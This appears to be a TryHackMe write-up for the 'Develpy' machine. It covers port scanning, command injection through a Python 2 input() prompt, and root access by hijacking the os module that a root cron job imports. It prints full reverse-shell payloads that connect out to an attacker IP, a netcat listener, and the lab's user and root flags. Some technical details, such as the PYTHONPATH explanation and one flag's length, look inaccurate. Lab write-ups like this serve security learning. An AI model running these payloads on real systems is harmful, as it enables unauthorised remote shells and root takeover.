# Develpy Writeup - TryHackMe 🚩

This writeup documents the exploitation process for the **Develpy** machine on TryHackMe, covering everything from initial scanning to gaining `root` access via **Python Library Hijacking**.

## 1. Reconnaissance

The process began with a port scan using `nmap` to identify services running on target `10.81.159.78`.

```bash
nmap 10.81.159.78
```

Scan Results:

Port 22 (SSH): Open

Port 10000 (snet-sensor-mgmt): Open

![Nmap Results](assets/Screenshot1.png)
<br>

2. Initial Access (User: king)
The service on port 10000 runs a Python 2 script that uses the input() function. In Python 2, this function is vulnerable to Command Injection because it evaluates user input as live Python code.

I executed the following reverse shell payload:

Python
```bash
__import__('os').system('python -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'192.168.155.18\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\'/bin/bash\')\"')
```
![Initial Shell](assets/Screenshot2.png)
<br>
Results:

Successfully obtained a shell as user king.

User Flag: cf85ff769cfaa721758949bf870b019

![User Flag](assets/Screenshot3.png)
<br>

3. Privilege Escalation (To Root)
Enumeration revealed a root cronjob that runs a Python script located at /root/company/media/*.py. The system executes this script after performing a cd into the /home/king directory.

Technique: Python Library Hijacking
Since the working directory is writable by user king, I used the PYTHONPATH environment variable to hijack the module loading process.

Exploitation Steps:

Created a malicious os.py file containing a reverse shell payload.

Set PYTHONPATH to point to /home/king so the malicious module is loaded first.

```bash
echo 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.155.18",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' > /home/king/os.py
export PYTHONPATH=/home/king
```
![Hijack Setup](assets/Screenshot4.png)
<br>

4. Capturing the Root Flag
I set up a netcat listener on my local machine (Kali Linux) using the port defined in the malicious os.py script.

```bash
nc -lvpn 4444
```

When the cronjob ran, the Python interpreter loaded my fake os module, executing the reverse shell with root privileges.

```bash
cat /root/root.txt
```
Final Results:

Root Flag: 9c37646777a53910a347f387dce025ec


![Root Shell](assets/Screenshot5.png)
<br>

Final

![Root Shell](<./assets/Screenshot6.png>)
<br>


